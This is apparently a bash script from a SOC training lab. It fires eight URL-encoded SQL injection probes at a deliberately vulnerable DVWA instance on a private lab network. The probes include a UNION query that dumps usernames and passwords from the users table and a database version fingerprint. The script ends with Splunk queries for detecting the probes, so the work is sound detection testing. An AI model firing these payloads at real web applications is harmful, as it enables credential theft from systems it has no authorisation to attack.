#!/bin/bash
#==============================================================================
# SOC Lab — SQL Injection Simulation
# Phase 2: Manual SQL Injection Probes (MITRE ATT&CK T1190)
#
# Author : Shankar
# Target : 10.10.10.10/DVWA (Windows 10 victim, Apache + DVWA, Security=Low)
# Source : 10.10.10.5 (Kali attacker)
#
# This phase fires 7 hand-crafted SQLi payloads against the DVWA SQLi page,
# each demonstrating a different injection technique. Unlike Phase 1, traffic
# volume is LOW — detection must rely on payload content, not volume.
#
# Usage:
#   ./phase2_manual_sqli.sh "PHPSESSID=abc123xyz"
#==============================================================================

set -u

# --- Validate arguments ---
if [[ $# -lt 1 ]]; then
    echo "ERROR: PHPSESSID cookie required"
    echo ""
    echo "Usage: $0 \"PHPSESSID=<your_session_id>\""
    echo ""
    echo "To get your cookie:"
    echo "  1. Login to DVWA on Windows browser (admin/password)"
    echo "  2. Set DVWA Security = Low"
    echo "  3. F12 -> Application/Storage -> Cookies -> copy PHPSESSID value"
    exit 1
fi

PHPSESSID_VALUE="$1"
# Strip "PHPSESSID=" prefix if user pasted the whole thing
PHPSESSID_VALUE="${PHPSESSID_VALUE#PHPSESSID=}"

# --- Config ---
TARGET_IP="10.10.10.10"
TARGET_URL="http://${TARGET_IP}/DVWA/vulnerabilities/sqli/"
COOKIE="PHPSESSID=${PHPSESSID_VALUE}; security=low"
OUTDIR="${HOME}/sqli_sim"
LOGFILE="${OUTDIR}/phase2.log"
RESPDIR="${OUTDIR}/phase2_responses"

# --- Setup ---
mkdir -p "${OUTDIR}" "${RESPDIR}"

log() {
    echo "$@" | tee -a "${LOGFILE}"
}

banner() {
    log ""
    log "=============================================================="
    log " $1"
    log "=============================================================="
}

# Send a single probe and capture response
# Args: probe_number, description, payload (URL-encoded already)
probe() {
    local num="$1"
    local desc="$2"
    local payload="$3"
    local url="${TARGET_URL}?id=${payload}&Submit=Submit"
    local respfile="${RESPDIR}/probe_${num}.html"

    log ""
    log "----- Probe ${num}: ${desc} -----"
    log "Payload    : ${payload}"
    log "Full URL   : ${url}"
    log "Time (UTC) : $(date -u +%Y-%m-%dT%H:%M:%S.%3NZ)"

    # Capture HTTP code + response body
    local http_code
    http_code=$(curl -s -b "${COOKIE}" -o "${respfile}" -w "%{http_code}" "${url}")

    log "HTTP code  : ${http_code}"
    log "Response   : ${respfile}"

    # Small inter-probe pause for clean log separation in Splunk
    sleep 1
}

# --- Pre-flight ---
banner "PHASE 2 - MANUAL SQL INJECTION  |  MITRE T1190"
log "Start time   : $(date -u +%Y-%m-%dT%H:%M:%SZ)"
log "Attacker     : $(hostname) ($(hostname -I | awk '{print $1}'))"
log "Target       : ${TARGET_URL}"
log "Session ID   : ${PHPSESSID_VALUE:0:8}... (truncated)"

log ""
log "[*] Pre-flight: verifying DVWA session is valid..."
PREFLIGHT_CODE=$(curl -s -b "${COOKIE}" -o /dev/null -w "%{http_code}" --max-time 5 "${TARGET_URL}?id=1&Submit=Submit")

if [[ "${PREFLIGHT_CODE}" != "200" ]]; then
    log "ERROR: pre-flight got HTTP ${PREFLIGHT_CODE} (expected 200)"
    log "  - Is the session cookie still valid? (DVWA sessions expire)"
    log "  - Is DVWA Security level set to Low?"
    exit 1
fi
log "[+] Session valid (HTTP ${PREFLIGHT_CODE}) — beginning probes"

# --- The 7 probes ---
# Note: payloads are URL-encoded inline. Spaces = +, single quote = %27, etc.

banner "Probes — each tests a different SQLi technique"

probe "1" \
    "Baseline (no injection) — for log comparison" \
    "1"

probe "2" \
    "Single quote — trigger SQL syntax error (error-based recon)" \
    "1%27"

probe "3" \
    "Boolean tautology — classic auth bypass pattern" \
    "1%27+OR+%271%27%3D%271"

probe "4" \
    "Comment terminator — remove trailing SQL after injection" \
    "1%27+--+"

probe "5" \
    "UNION column discovery (1 column)" \
    "1%27+UNION+SELECT+NULL--+"

probe "6" \
    "UNION column discovery (2 columns — DVWA's actual count)" \
    "1%27+UNION+SELECT+NULL%2CNULL--+"

probe "7" \
    "UNION data extraction — dump credentials from users table" \
    "1%27+UNION+SELECT+user%2Cpassword+FROM+users--+"

probe "8" \
    "Version disclosure — fingerprint the DBMS" \
    "1%27+UNION+SELECT+null%2Cversion%28%29--+"

# --- Summary ---
banner "PHASE 2 COMPLETE"
log "End time : $(date -u +%Y-%m-%dT%H:%M:%SZ)"
log ""
log "Probes sent : 8 (1 baseline + 7 SQLi payloads)"
log "Responses   : ${RESPDIR}/probe_*.html"
log ""
log "Detection strategy reminder:"
log "  Phase 1 (recon) used VOLUME-based detection — won't catch this."
log "  Phase 2 needs CONTENT-based detection (payload signatures)."
log ""
log "Splunk validation queries:"
log ""
log '  # A. Catch SQL metacharacters in query string'
log '  index=main sourcetype=access_combined clientip=10.10.10.5'
log '    (uri_query="*%27*" OR uri_query="*UNION*" OR uri_query="*--*"'
log '     OR uri_query="*OR*1*" OR uri_query="*SELECT*")'
log '  | table _time uri_query status'
log '  | sort _time'
log ''
log '  # B. Inspect Apache error log for SQL syntax errors'
log '  index=main sourcetype=apache_error earliest=-15m'
log '  | table _time message'
log ''
log '  # C. Compare response sizes - data extraction returns more bytes'
log '  index=main sourcetype=access_combined clientip=10.10.10.5'
log '    uri_path="*sqli*" earliest=-15m'
log '  | table _time uri_query bytes status'
log '  | sort _time'
